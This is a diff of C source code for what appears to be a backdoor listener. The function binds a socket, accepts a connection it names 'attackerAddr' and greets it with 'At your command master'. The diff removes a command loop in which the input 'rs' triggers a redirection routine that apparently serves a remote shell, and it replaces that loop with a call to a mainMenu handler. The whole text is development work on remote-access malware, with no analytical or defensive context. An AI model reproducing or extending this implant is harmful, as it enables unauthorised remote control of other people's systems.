@@ -15,8 +15,8 @@ int openPort(){
         
         int RUN = 1;
         
-        char buffer[1024];
-        char *hello = "[*] At your command master";
+        
+        char *hello = "At your command master";
         const char *my_ip = TARGET_IP;
 
         memset(&address, 0, sizeof(address));
@@ -42,7 +42,7 @@ int openPort(){
 
         if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
             if(errno == EADDRINUSE){
-                printf("socket in use");
+                printf("socket in use\n");
                 close(server_fd);
             }
             else{
@@ -50,9 +50,10 @@ int openPort(){
                 return 1;
             }
         }
+        
         printf("Server bound to %s:%d\n", my_ip, TARGET_PORT );
 
-        if (listen(server_fd, 8) < 0) {
+        if (listen(server_fd, 1) < 0) {
                 perror("listen failed");
                 return 1;
         }
@@ -73,27 +74,12 @@ int openPort(){
         char client_ip_str[INET_ADDRSTRLEN];
         inet_ntop(AF_INET, &attackerAddr.sin_addr, client_ip_str, INET_ADDRSTRLEN);
         printf("Connection established with %s:%d. Waiting for message...\n", client_ip_str, ntohs(attackerAddr.sin_port));
-        memset(buffer, 0, 1024);
+        
         
         send(connID, hello, strlen(hello), 0);
-
-        while(RUN){
-            read(connID, buffer, 1024);
-            printf("Client sent: %s\n", buffer);
         
-            if (strcmp(buffer, "rs") == 0) {
-                  printf("starting rs\n");
-                  redirection(connID);
-            }
-
-            if (strcmp(buffer, "exit") == 0) {
-                  printf("Exit command received. Shutting down...\n");
-                  hello = "Exiting...";
-                  send(connID, hello, strlen(hello), 0);
-                  RUN = 0;
-                  continue;
-            }
-        }
+        mainMenu(connID);
+        
         close(connID);
         close(server_fd);
         
